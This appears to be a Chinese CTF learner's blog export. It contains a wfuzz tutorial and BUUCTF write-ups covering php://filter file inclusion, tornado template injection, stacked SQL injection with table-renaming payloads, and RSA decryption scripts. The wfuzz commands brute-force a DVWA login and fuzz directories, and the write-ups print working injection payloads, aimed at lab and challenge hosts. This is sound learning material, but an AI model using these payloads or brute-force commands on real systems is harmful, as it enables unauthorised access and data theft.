{"meta":{"title":"奇点的小屋！","subtitle":"Network security only","description":"hello，我是奇点！欢迎来到我的网安世界！","author":"奇点","url":"https://qidian-png.github.io","root":"/"},"pages":[{"title":"文章分类","date":"2020-05-11T02:16:43.000Z","updated":"2020-05-11T02:18:14.763Z","comments":true,"path":"categories/index.html","permalink":"https://qidian-png.github.io/categories/index.html","excerpt":"","text":""},{"title":"文章分类","date":"2020-05-11T02:21:50.000Z","updated":"2020-05-11T02:23:34.066Z","comments":true,"path":"tags/index.html","permalink":"https://qidian-png.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"wfuzz学习","slug":"wfuzz学习","date":"2020-10-04T08:34:05.000Z","updated":"2020-10-04T08:41:15.003Z","comments":true,"path":"2020/10/04/wfuzz学习/","link":"","permalink":"https://qidian-png.github.io/2020/10/04/wfuzz%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"@TOC 前言Wfuzz是一个基于Python的Web爆破程序，它支持多种方法来测试WEB应用的漏洞。它的功能太多了。kail里也有，Windows也可以自己装。 我们可以用它找漏洞 1234567891011121314151617可预测的认证可预测的session标志（session id）可预测的资源定位（目录和文件）注入路径遍历溢出跨站脚本认证漏洞不安全的直接对象引用 wfuzz里也自带了很多的字典 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758.├── Injections│ ├── All_attack.txt│ ├── SQL.txt│ ├── Traversal.txt│ ├── XML.txt│ ├── XSS.txt│ └── bad_chars.txt├── general│ ├── admin-panels.txt│ ├── big.txt│ ├── catala.txt│ ├── common.txt│ ├── euskera.txt│ ├── extensions_common.txt│ ├── http_methods.txt│ ├── medium.txt│ ├── megabeast.txt│ ├── mutations_common.txt│ ├── spanish.txt│ └── test.txt├── others│ ├── common_pass.txt│ └── names.txt├── stress│ ├── alphanum_case.txt│ ├── alphanum_case_extra.txt│ ├── char.txt│ ├── doble_uri_hex.txt│ ├── test_ext.txt│ └── uri_hex.txt├── vulns│ ├── apache.txt│ ├── cgis.txt│ ├── coldfusion.txt│ ├── dirTraversal-nix.txt│ ├── dirTraversal-win.txt│ ├── dirTraversal.txt│ ├── domino.txt│ ├── fatwire.txt│ ├── fatwire_pagenames.txt│ ├── frontpage.txt│ ├── iis.txt│ ├── iplanet.txt│ ├── jrun.txt│ ├── netware.txt│ ├── oracle9i.txt│ ├── sharepoint.txt│ ├── sql_inj.txt│ ├── sunas.txt│ ├── tests.txt│ ├── tomcat.txt│ ├── vignette.txt│ ├── weblogic.txt│ └── websphere.txt└── webservices ├── ws-dirs.txt └── ws-files.txt 安装我就不说了 基本用法: 参数： 123456ID: 按执行顺序排列 IDResponse: HTTP 响应状态Lines： HTTP 响应中的行数Word：HTTP 响应中单词个数Char：HTTP 响应的字节数Payload：FUZZ 中的字典 到后面我们可以根据响应状态，行数等等，进行自定义过滤。 爆破网站后台文件1wfuzz -w wordlist URL&#x2F;FUZZ.php 通过这个payload我们可以看到网站后台的php文件 爆破网站后台目录1wfuzz -w wordlist URL&#x2F;FUZZ 类似于dirsearch的扫描，扫面网站后台目录，但是这个需要你的字典足够强大。 遍历URL中的参数对于网站http://127.0.0.1/index.php?id=12如果其存在未授权漏洞 我们可以用 1wfuzz -z range,000-999 http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?id&#x3D;FUZZ range就是参数id的可取范围 当然，如果需要cookie的话，也行 1wfuzz -z range,000-999 -b session&#x3D;session -b cookie&#x3D;cookie http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?uid&#x3D;FUZZ 如果要加多个cookie的话，需要多次指定 访问请求时会在 header 中加入 Cookie: cookie1=x cookie2=xxx 1-b cookie&#x3D;xxx -b cookie&#x3D;xxx 对于某些页面如果没有cookie，不会允许我们访问，直接跳转到错误页面，这就使FUZZ结果不是很准确。 POST请求登录框，弱口令爆破 在DVWA里暴力破解 传参格式：username=&amp;password= 构造payload：wfuzz -w /usr/share/wfuzz/wordlist/general/mima.txt -w /usr/share/wfuzz/wordlist/general/mima.txt -d &quot;username=FUZZ&amp;password=FUZ2Z&quot; http://192.168.46.129/vulnerabilities/brute/ -w 后面加字典的路径，因为有两个参数，所以要用两次- w。 -d 参数以POST格式传参 ，后面是格式。 最后是URL，爆破的过程是漫长且还要根据你字典的大小。 在这里说一下 123wfuzz -z file --zP fn&#x3D;~&#x2F;Desktop&#x2F;word.txt URL&#x2F;FUZZwfuzz -w ~&#x2F;桌面&#x2F;word.txt URL&#x2F;FUZZwfuzz -z file,~&#x2F;桌面&#x2F;word.txt URL&#x2F;FUZZ 上面的虽然payload不一样，但是结果都是等效的。 -z 参数是指定一个可用的 payload 模块，–zP 是指定 payload 中的参数看下 file 模块的详细信息 我是用最多的可能是中间的那种方式。 使用多个payload并且同时爆破目录和文件 wfuzz -w /usr/share/wfuzz/wordlist/general/mima.txt -w /usr/share/wfuzz/wordlist/general/mima.txt -d http://192.168.46.129/vulnerabilities/brute/FUZZ/FUZ2Z/FUZNZ 因为有多个payload所以需要我们通过改变n的值来指定我们使用的是哪一个。 fuzz的过滤器不得不说过滤器真是个好东西，它能给我们省下很多时间。就比如说我们后台爆破的时候可以直接过滤掉我们不想看到的错误码，还有SQL注入时候，也是对我们有很大的帮助。 我就说一下简单的参数: 隐藏响应结果 1通过 --hc ， --hl ， --hw ， --hh 参数可以隐藏某些HTTP响应。 栗子 wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -w /usr/share/wfuzz/wordlist/general/common.txt –hc 302 -d “username=FUZZ&amp;password=FUZ2Z” http://192.168.46.129/vulnerabilities/brute/ 因为302的信息太多，直接用 - -hc过滤掉，这个就可以隐藏响应状态为302的信息。 我们也可以过滤多个响应状态，用，隔开就行了， – hc 302,404 –hh 178 过滤掉返回数据字符串长度为178的信息 有隐藏就又显示 参数：–sc ， –sl ， –sw ， –sh 比如我们只需要201，350的状态的数据则 wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -w /usr/share/wfuzz/wordlist/general/common.txt –sc 302 -d “username=FUZZ&amp;password=FUZ2Z” http://192.168.46.129/vulnerabilities/brute/ 使用BaselineBaseline (基线) 就是针对 HTTP Response 构建过滤器。 1wfuzz -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt --hh bbb http:&#x2F;&#x2F;192.168.46.129&#x2F;vulnerabilities&#x2F;brute&#x2F;&#123;zxc&#125; {}被指定第一次HTTP请求时用来替换 FUZZ占位符 的值，其返回的响应码将被标记为 BBB ，并用于过滤条件中。 在下面的测试中，如果再遇到BBB,则直接过滤了。 ⑧基于正则表达式的过滤 参数：-- hs,--ss wfuzz -c -w ~/Desktop/word.txt –hs “404 Not Found” URL/FUZZ/ FUZZing自定义headers对于某些目标站点，可能会对我们的user-agent，而这种情况就需要我们自定义了 $ wfuzz -w word.txt -H “user-agent:aaa” URL/FUZZ Fuzzing HTTP 协议简单的说就是测试这个站点的HTTP请求方式，get还是post等等。 wfuzz -z list,GET-HEAD-POST-TRACE-OPTIONS -X FUZZ URL FUZZ的代理设置 如果在 fuzz 中设置代理使用 -p proxy地址，代理支持 SOCKS4、SOCKS5 也支持多个代理只需要使用多个 -p 参数。(当我们需要访问国外站点时，就需要代理了) 普通代理： $ wfuzz -w word.txt -p localhost:8000 url SOCKS4 $ wfuzz -w word.txt -p localhost:8000: SOCKS4 url SOCKS5 $ wfuzz -w word.txt -p localhost:8000 :SOCKS5 url 递归FUZZING测试使用-R参数可以指定一个payload被递归的深度。 例如：爆破目录时，我们想使用相同的payload对已发现的目录进行测试，可以使用如下命令： 1wfuzz -z list,&quot;admin-login.php-test.php&quot; -R 1 URL&#x2F;FUZZ 1 就是指在我们已经测试出来的目录再递归一次字典 。 例如：测试admin目录下是否还存在admin 并发在 fuzz 中如果目标存在 waf，发送请求并发太高会被禁止，wfuzz 中可以使用 -t 参数来增加或减少并发数量，也可以使用 -s 指定每次请求后的间隔秒数 这个找不到好的栗子，就借鉴JBlock大师傅的了 e.g. 你想测试一个网站的转账请求是否存在HTTP并发漏洞（条件竞争） 请求地址：http://127.0.0.1/dorabox/race_condition/pay.php POST请求正文：money=1 使用如下命令： wfuzz -z range,0-20 -t 20 -d “money=1” http://127.0.0.1/dorabox/race_condition/pay.php?FUZZ 测试并发要控制请求次数，在这里为使用range模块生成0-20，然后将FUZZ占位符放在URL的参数后不影响测试即可，主要是用-t参数设置并发请求，该参数默认设置都是10。 测试结果输出为文件这个功能是插件printers提供的 格式： 123456789Available printers: Name | Summary -------------------------------------------------- csv | CSV printer ftw html | Prints results in html format json | Results in json format magictree | Prints results in magictree format raw | Raw output format 使用-f参数，指定值的格式为输出文件位置,输出格式。 1$ wfuzz -f outfile,html -w wordlist URL&#x2F;FUZZ fuzzing常用的使用方法就说到这吧，至于高阶的我以后碰到再记录。 理论总没有实战有意思！！！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://qidian-png.github.io/tags/web%E5%AD%A6%E4%B9%A0/"}]},{"title":"每周刷题(三)","slug":"每周刷题(三)","date":"2020-10-03T09:41:05.000Z","updated":"2020-10-04T08:39:09.077Z","comments":true,"path":"2020/10/03/每周刷题(三)/","link":"","permalink":"https://qidian-png.github.io/2020/10/03/%E6%AF%8F%E5%91%A8%E5%88%B7%E9%A2%98(%E4%B8%89)/","excerpt":"","text":"@TOC web 1 [极客大挑战 2019]Havefun打开是一个猫，什么也没有，然后F12查看源码 1234567&lt;!-- $cat&#x3D;$_GET[&#39;cat&#39;]; echo $cat; if($cat&#x3D;&#x3D;&#39;dog&#39;)&#123; echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;; &#125; --&gt; 在不起眼的地方得到了这个，如果输入的为dog，即?cat=dog,那么就能得到flag web 2 [极客大挑战 2019]Secret Fileemmm,查看页面源代码，你会发现.Archive_room.php 然后跳转到那我们再次查看源代码，会发现./action.php,点击一下，跳转到end.php,这就让我很懵逼，但根据后面页面的提示就知道action.php，停留时间极短，然后直接跳转到end.php 那我们就试一下抓包 得到 1234567&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;!-- secr3t.php --&gt;&lt;&#x2F;html&gt; 我们访问secr3t.php 得到 123456789101112&lt;?php highlight_file(__FILE__); error_reporting(0); $file&#x3D;$_GET[&#39;file&#39;]; if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); &#x2F;&#x2F;flag放在了flag.php里?&gt; 应该有文件包含漏洞 看到了flag.php去访问量一下emmmm,看了一下源代码没有什么东西还是看那串代码吧 1234567891011&lt;?php highlight_file(__FILE__); error_reporting(0); $file&#x3D;$_GET[&#39;file&#39;]; if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); &#x2F;&#x2F;flag放在了flag.php里?&gt; 我们要绕过那几个敏感词，但是file没有过滤filter我们可以用php://filter来获取flag。 然后我们就可以构造payload：secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php 然后得到一串base64加密的字符 PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7YjFhMzgyYmQtMTE5NS00Mjk4LTlhYzctMzIzNzlhOTNmNTJlfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo= 解密一下得到flag web 3 [护网杯 2018]easy_tornado有三个txt文件 根据题目的tornado，意思就是一个用Python语言写成的Web服务器兼Web应用框架。/flag.txt里是 12&#x2F;flag.txtflag in &#x2F;fllllllllllllag /welcome.txt里是 12&#x2F;welcome.txtrender /hints.txt里是 12&#x2F;hints.txtmd5(cookie_secret+md5(filename)) 看url:http://bba92278-0b8e-488d-9597-a10f2c32bb82.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=17d621fb10cd85c171cba6d7dafc3044 访问一个文件我们需要有两个条件filename和filehash 将fllllllllllllag替换掉filename 得到报错看url:http://bba92278-0b8e-488d-9597-a10f2c32bb82.node3.buuoj.cn/error?msg=ErrorError可以被替换为任何字符 ?msg=123到这我就不会了，看了大佬wp 知道了知道了这是个模板注入，并且/welcome.txt里的render是python的一个渲染函数。 报错时候的 url 是这样的 在 tornado 模板中，存在一些可以访问的快速对象 12345&lt;title&gt; &#123;&#123; escape(handler.settings[&quot;cookie&quot;]) &#125;&#125;&lt;&#x2F;title&gt; 那么我们构造payload：http://bba92278-0b8e-488d-9597-a10f2c32bb82.node3.buuoj.cn/error?msg= 我们得到了文件名和cookie 我们对其加密得到了cc85887d4387a3df37a470ab517184d2 我这种加密方式比较麻烦 直接上脚本 1234567891011121314import hashlibdef md5value(s): md5 &#x3D; hashlib.md5() md5.update(s) return md5.hexdigest()def jiami(): filename &#x3D; ‘&#x2F;fllllllllllllag‘ cookie_s &#x3D;&quot;5c68d92e-9f4d-42a4-8960-a98b331de3c1&quot; print(md5value(filename.encode(‘utf-8‘))) x&#x3D;md5value(filename.encode(‘utf-8‘)) y&#x3D;cookie_s+xprint(md5value(y.encode(‘utf-8‘)))jiami() 记得cookie要换成自己的 然后构造payload：http://bba92278-0b8e-488d-9597-a10f2c32bb82.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=cc85887d4387a3df37a470ab517184d2 得到flag web 4 [ACTF2020 新生赛]Include这种题要不就是查看源码，要不就是文件包含。 url：http://81225635-3118-452e-bd92-27cfaee9ec23.node3.buuoj.cn/?file=flag.php 我们也就可以构造payload：?file=php://filter/read=convert.base64-encode/resource=flag.php 得到：PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MDdhNjI1ZTMtZGFlNC00ZTZlLWI0ZjMtNjZmMmZkNWUzZDlhfQo= 再base64解密，得到flag Crypto 1 [BJDCTF 2nd]灵能精通-y1ng得到一个没有后缀的文件，通过分析得到它是jfif文件 打开 这是啥？ 我懵逼了 看大佬wp,知道了这是猪圈加密的变形圣堂武士密码(第一次碰见，无知是多么可怕啊) 对照表,得到flag{IMKNIGHTSTEMPLAR} Cypto 2 权限获得第一步附件里是：Administrator:500:806EDC27AA52E314AAD3B435B51404EE:F4AD50F57683D4260DFD48AA351A17A8::: 对806EDC27AA52E314AAD3B435B51404EE和F4AD50F57683D4260DFD48AA351A17A8解密，但是第一个没有解密出来，第二个是3617656，提交就是flag。 太突然了。 Cypto 3 萌萌哒猪八戒猪？ 猪圈密码？ 附上我收藏的网站猪圈密码解密 得到flag{whenthepigwanttoeat} Cypto 4 [BJDCTF 2nd]Y1nglish-y1ng打开附件 最后一行很熟悉，这就让我想到了替换密码，但是不知道替换的值是什么😅😅😅 看了大师傅wp,是BJD 出的题，所以MIH=BJD 恕我做题太少，没想到 暴力破解网站直接破解，取第一个解密值：BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy} 但是还需要改某个单词，就是将Cr4cy改成Cr4ck是Crack吗？ Misc 1 被嗅探的流量是流量分析题在HTTP里找到，文件上传的信息双击看具体信息看到了flag{da73d88936010da1eeeb36e945ec4b97} Misc 2 小明的保密箱知道图片里有个有密码的压缩包，我用foremost分离出来。 当然也可以直接修改后缀为zip 也可以用winhex分离出来 如何知道是四位纯数字，直接爆破。 得到flag{75a3d68bf071ee188c418ea6cf0bb043} Crypto 3 爱因斯坦又是一张图片 winhex看了一下 flag.txt 又分离得到加密的文件，密码是啥？ 别忘了看图片属性里隐藏的信息。 里面给出了密码。 Cypto 4 easycap流量分析题追踪tcp流即可得到flag!!!","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"刷题","slug":"刷题","permalink":"https://qidian-png.github.io/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"浅谈CTF密码学RSA加密知识","slug":"浅谈CTF密码学RSA加密知识","date":"2020-09-27T08:28:05.000Z","updated":"2020-09-27T09:01:47.112Z","comments":true,"path":"2020/09/27/浅谈CTF密码学RSA加密知识/","link":"","permalink":"https://qidian-png.github.io/2020/09/27/%E6%B5%85%E8%B0%88CTF%E5%AF%86%E7%A0%81%E5%AD%A6RSA%E5%8A%A0%E5%AF%86%E7%9F%A5%E8%AF%86/","excerpt":"","text":"@TOC 前言啥是RSA呢？ RSA公开密钥密码体制是一种使用不同的加密密钥与解密密钥，“由已知加密密钥推导出解密密钥在计算上是不可行的”密码体制 。在公开密钥密码体制中，加密密钥（即公开密钥）PK是公开信息，而解密密钥（即秘密密钥）SK是需要保密的。加密算法E和解密算法D也都是公开的。虽然解密密钥SK是由公开密钥PK决定的，但却不能根据PK计算出SK 。 说了一大堆，也没懂！总之就是很🐂🍺的加密算法。 根据密钥的使用方法，可以将密码分为对称密码和公钥密码对称密码：加密和解密使用同一种密钥的方式公钥密码：加密和解密使用不同的密码的方式，因此公钥密码通常也称为非对称密码 在学RSA之前，我们需要知道一点数学知识。 ①素数 素数又称质数，指在一个大于1的自然数中，除了1和此整数自身外，不能被其他自然数整除的数。 ②互质数 公因数只有1的两个数，叫做互质数。互质，又称互素。若N个整数的最大公因子是1，则称这N个整数互质。 常见的互质数判断方法主要有以下几种： 两个不同的质数一定是互质数。例如，2与7、13与19。 一个质数，另一个不为它的倍数，这两个数为互质数。例如，3与10、5与 26。 相邻的两个自然数是互质数。如 15与 16。 相邻的两个奇数是互质数。如 49与 51。 较大数是质数的两个数是互质数。如97与88。 2和任何奇数是互质数。 1不是质数也不是合数，它和任何一个自然数在一起都是互质数。辗转相除法。 ③指数运算 指数运算又称乘方计算，计算结果称为幂。nm指将n自乘m次。把nm看作乘方的结果，叫做”n的m次幂”或”n的m次方”。其中，n称为“底数”，m称为“指数”。 ④模运算 模运算即求余运算。“模”是“Mod”的音译。和模运算紧密相关的一个概念是“同余”。数学上，当两个整数除以同一个正整数，若得相同余数，则二整数同余。 两个整数a，b，若它们除以正整数m所得的余数相等，则称a，b对于模m同余，记作: a ≡ b (mod m)；读作：a同余于b模m，或者，a与b关于模m同余。例如：26 ≡ 14 (mod 12)。 知道一些参数 N: 是两个素数的乘积，一般这两个素数在RSA中用字母p,q表示E: 是一个素数D是E模 varphi(n) 的逆元，CTF的角度看就是，D是由E,p,q可以求解出的一般CTF就是把我们想要获得的flag作为明文，RSA中表示为m。然后通过RSA加密，得到密文，RSA中表示为C。 加密过程 1密文＝明文 ^ E mod N 加密即对明文的E(Encryption)次方再除以N(Number)求余，只要我们知道E,N就可以对明文加密 解密过程 1明文&#x3D;密文^D mod N 对密文的D次方再除以N求余数，就能得到明文。 E,N是公钥对 (可公布的)D,N是私钥对 N 1N&#x3D;p*q 质数p,q(不要太小，容易被爆破出来) 在这里多个中间数L 1L&#x3D;lcm((q-1)*(p-1)) L 是 p－1 和 q－1的最小公倍数 E满足两个条件： ①E是一个比1大比L小的数②E和L的最大公约数为1 D需满足 121 &lt; D &lt; LE＊D mod L ＝ 1 看几道题吧 RSA12在一次RSA密钥对生成中，假设p&#x3D;473398607161，q&#x3D;4511491，e&#x3D;17求解出d作为flga提交 ①NN=pq②LL=lcm((q-1)(p-1))③EE是一个比1大比L小的数E和L的最大公约数为1④1 &lt; D &lt; LE＊D mod L ＝ 1 这样就能求出来D 我上次是用工具直接得到D 脚本 1234567891011121314151617import gmpy2def Decrypt(c,e,p,q): L&#x3D;(p-1)*(q-1) d&#x3D;gmpy2.invert(e,L) n&#x3D;p*q m&#x3D;gmpy2.powmod(c,d,n) flag&#x3D;str(d) print(&quot;flag&#123;&quot;+flag+&quot;&#125;&quot;)if __name__ &#x3D;&#x3D; &#39;__main__&#39;: p&#x3D;473398607161 q&#x3D;4511491 e&#x3D;17 c&#x3D;55 Decrypt(c,e,p,q) rsarsa123456789Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm.p &#x3D; 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q &#x3D; 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e &#x3D; 65537c &#x3D; 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034Use RSA to find the secret message 给了我们密文C，还有公钥对p,q,当然还有e,我们可以求出N 工具对位数有限制 直接上脚本 1234567891011121314151617import gmpy2def Decrypt(c,e,p,q): L&#x3D;(p-1)*(q-1) d&#x3D;gmpy2.invert(e,L) n&#x3D;p*q m&#x3D;gmpy2.powmod(c,d,n) flag&#x3D;str(m) print(&quot;flag&#123;&quot;+flag+&quot;&#125;&quot;)if __name__ &#x3D;&#x3D; &#39;__main__&#39;: p &#x3D; 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483 q &#x3D; 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407 e &#x3D; 65537 c &#x3D; 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034 Decrypt(c,e,p,q) 直接得到flag，不得不说jio本太方便了 RSA112345p &#x3D; 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q &#x3D; 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp &#x3D; 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq &#x3D; 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c &#x3D; 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 对于dp,dq 12dp&#x3D;d%(p-1)dq&#x3D;d%(q-1) 我们写脚本(借) 1234567891011121314151617import gmpy2import binasciidef decrypt(dp,dq,p,q,c): InvQ &#x3D; gmpy2.invert(q,p) mp &#x3D; pow(c,dp,p) mq &#x3D; pow(c,dq,q) m&#x3D;(((mp-mq)*InvQ)%p)*q+mq temp_flag&#x3D;binascii.unhexlify(hex(m)[2:]) flag&#x3D;&#39;flag&#39;+temp_flag[6:] print(flag)p &#x3D; 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q &#x3D; 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp &#x3D; 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq &#x3D; 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c &#x3D; 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852decrypt(dp,dq,p,q,c) emmm,密码学太难了","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Cypto学习","slug":"Cypto学习","permalink":"https://qidian-png.github.io/tags/Cypto%E5%AD%A6%E4%B9%A0/"}]},{"title":"每周刷题(二)","slug":"每周刷题(二)","date":"2020-09-26T11:12:05.000Z","updated":"2020-09-27T09:02:59.131Z","comments":true,"path":"2020/09/26/每周刷题(二)/","link":"","permalink":"https://qidian-png.github.io/2020/09/26/%E6%AF%8F%E5%91%A8%E5%88%B7%E9%A2%98(%E4%BA%8C)/","excerpt":"","text":"题目来源:BUUCTF@TOC web 1[强网杯 2019]随便注先判断是否有注入点，试一下1&#39; 注入点找到了 然后判断出列数222222 再用1&#39; union select 1,database(); #出现了报错select等字符被过滤了,正常注入不能用，报错注入也不行! 看了下大师傅的WP尝试用堆叠注入。 我们先构造payload：1&#39; ;show database; #再次构造payload1&#39; ;show tables; #查看有几个表只有两个表从两个表里，我们再查询列构造payload：0&#39;; show columns from words ;#再构造payload： 10&#39;;show columns from &#96;1919810931114514&#96;;# 先前忘了给字符加单引号，试了n次也没成功！到最后加字符才知道自己的无知太可怕，浪费了很多时间！！！ 找到了flag的的列，下一步就是如何让他回显出来 上图，我们知道正则匹配过滤了很多字符，但是没有过滤alert和rename，这就可以来波骚姿势了 ①先把words表改为word1 ②再利用rename将1919810931114514这个表修改为word ③再将flag字段修改成id 构造payload： 10&#39;;RENAME TABLE &#96;words&#96; TO &#96;words1&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;# emmmmm,用1&#39;;show tables;# 修改成功了 访问0&#39; or &#39;1&#39;=&#39;1 得到flag 这波有点小细节浪费了点时间。这道题对于我来说新知识太多了，待好好消化。 web 2 EasySQL 刚刚学会堆叠注入，这又来了一道 先构造payload：1 ；show databases ; 得到数据库 再看表1 ；show tables;有个flag表 show columns from Flag???? 不行的 看大师傅wp神之payload，根据报错写出了查询语句select $_GET[&#39;query&#39;] || flag from flag ||意思是或，前面的语句为真，后面的语句便不再执行。 第一种思路 payload：*，1 那为什么payload能得到flag了 sql=select.post[‘query’].”||flag from Flag”;如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。 第二种思路 就是把||作为拼接符，再Oracle是支持的，但在MySQL里需要更改sql-mode 然后构造payload:1;set sql_mode=PIPES_AS_CONCAT;select 1 web题是真的难啊！！！ Cyrto 1信息化时代的步伐这是伟人说的一句话 打开附件得到606046152623600817831216121621196386 这种加密方式是：中文电码 哈哈哈哈哈，笑死我了 Cypto 2 凯撒？替换？呵呵!拿到一串字符：MTHJ{CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO} 我以为是变异凯撒，但找了n遍也没有找到规律。 看大师傅 wp，用了暴力破解 直接solve 第一个flag转小写，切记去掉所有空格，要不然会出错 Cypto 3 old-fashion得到一串字符 Os drnuzearyuwn, y jtkjzoztzoes douwlr oj y ilzwex eq lsdexosa kn pwodw tsozj eq ufyoszlbz yrl rlufydlx pozw douwlrzlbz, ydderxosa ze y rlatfyr jnjzli; mjy gfbmw vla xy wbfnsy symmyew (mjy vrwm qrvvrf), hlbew rd symmyew, mebhsymw rd symmyew, vbomgeyw rd mjy lxrzy, lfk wr dremj. Mjy eyqybzye kyqbhjyew mjy myom xa hyedrevbfn lf bfzyewy wgxwmbmgmbrf. Wr mjy dsln bw f1_2jyf-k3_jg1-vb-vl_l 没得感觉，按照上题就试了暴力破解 这句话总感觉怪怪的 1Wr mjy dsln bw f1_2jyf-k3_jg1-vb-vl_l hhhhh Misc 1 zip伪加密伪加密，我解决方法有两种 使用工具 直接破解 第二种，拉进winhex 原本的00 00改为09 00就会提示有密码了，换为00 00伪加密就没了 Misc 2 ningen得到一张图片 试着用Binwalk分析 分离出一个zip压缩包 但是有密码，直接去爆破 得到flag Misc 3 镜子里面的世界 文件名字就带有steg,我们直接就用隐写工具，仔细看几遍 red 0,green 0,blue 0最上方都有一串东西 我们data extract找到这三个通道 